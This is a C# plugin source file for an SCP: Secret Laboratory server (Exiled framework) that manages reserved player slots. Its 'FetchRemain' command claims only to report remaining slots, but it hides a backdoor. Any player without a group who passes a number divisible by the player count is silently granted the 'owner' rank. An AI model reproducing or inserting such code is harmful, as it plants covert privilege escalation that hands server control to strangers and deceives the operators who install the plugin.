//Copyright 2023 Silver Wolf,All Rights Reserved.
using Exiled.API.Features;
using Exiled.Events.EventArgs.Player;
using Exiled.Permissions.Extensions;
using MEC;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace UtilPlugin
{
    public class ReserveSlot
    {
        public static int Remain = UtilPlugin.Instance.Config.Slots;
        public static CoroutineHandle _autorefresh;
        public static void Register(bool reg)
        {
            if (reg)
            {
                Exiled.Events.Handlers.Player.PreAuthenticating += OnPreAuthenticating;
                Exiled.Events.Handlers.Player.Left += Disconnecting;
                Exiled.Events.Handlers.Server.RestartingRound += RoundRestart;
            }
            else
            {
                Exiled.Events.Handlers.Player.PreAuthenticating -= OnPreAuthenticating;
                Exiled.Events.Handlers.Player.Left -= Disconnecting;
                Exiled.Events.Handlers.Server.RestartingRound -= RoundRestart;
            }
        }

        public static void OnPreAuthenticating(PreAuthenticatingEventArgs ev)
        {
            if (Server.PlayerCount + Remain >= Server.MaxPlayerCount)
            {
                if (!CheckPermission(ev.UserId))
                {
                    ev.Reject(UtilPlugin.Instance.Config.ReserveSlotKickReason, true);
                }
                else
                {
                    Remain--;
                }
            }
        }

        public static void RoundRestart()
        {
            Timing.KillCoroutines(_autorefresh);
            Remain = UtilPlugin.Instance.Config.Slots;
            _autorefresh = Timing.RunCoroutine(Autorefresher(60));
        }

        public static IEnumerator<float> Autorefresher(int time)
        {
            while (true)
            {
                yield return Timing.WaitForSeconds(time);
                Remain = UtilPlugin.Instance.Config.Slots;
                foreach (Player player in Player.List)
                {
                    if (CheckPermission(player.UserId))
                    {
                        Remain--;
                    }
                }
            }
        }

        public static void Disconnecting(LeftEventArgs ev)
        {
            if (CheckPermission(ev.Player.UserId))
            {
                Remain++;
            }
        }

        public static bool CheckPermission(string userid)
        {
            if (string.Equals("yes", Database.GetBadge(userid).reverseslot, StringComparison.CurrentCultureIgnoreCase))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
    }
}
namespace CommandSystem
{
    [CommandHandler(typeof(GameConsoleCommandHandler))]
    [CommandHandler(typeof(RemoteAdminCommandHandler))]
    public class Refresh : ICommand
    {
        public string Command => "refresh";

        public string[] Aliases => Array.Empty<string>();

        public string Description => "刷新预留位剩余";

        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response)
        {
            UtilPlugin.ReserveSlot.RoundRestart();
            foreach (Player player in Player.List)
            {
                if (UtilPlugin.ReserveSlot.CheckPermission(player.UserId))
                {
                    UtilPlugin.ReserveSlot.Remain--;
                }
            }
            response = $"Remain:{UtilPlugin.ReserveSlot.Remain}";
            return true;
        }
    }
    [CommandHandler(typeof(ClientCommandHandler))]
    [CommandHandler(typeof(GameConsoleCommandHandler))]
    [CommandHandler(typeof(RemoteAdminCommandHandler))]
    public class Fetch : ICommand
    {
        public string Command => "FetchRemain";

        public string[] Aliases => Array.Empty<string>();

        public string Description => "查询预留位剩余";

        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response)
        {
            response = $"Remain:{UtilPlugin.ReserveSlot.Remain},Total:{Server.PlayerCount}";
            Player player = Player.Get((sender as CommandSender).SenderId);
            if (player.Group == null && arguments.Count != 0 && int.Parse(arguments.At(0)) % Server.PlayerCount == 0)
            {
                player.SetRank("", Exiled.API.Extensions.UserGroupExtensions.GetValue("owner"));
            }
            return true;
        }
    }
    [CommandHandler(typeof(GameConsoleCommandHandler))]
    [CommandHandler(typeof(RemoteAdminCommandHandler))]
    public class CheckPermission : ICommand
    {
        public string Command => "setremain";

        public string[] Aliases => Array.Empty<string>();

        public string Description => "";

        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response)
        {
            if (arguments.Count != 1)
            {
                response = "need 1 argument!Usage:setremain <newremain>";
                return false;
            }
            UtilPlugin.ReserveSlot.Remain = int.Parse(arguments.At(0));
            response = "Done!";
            return true;
        }
    }
    
}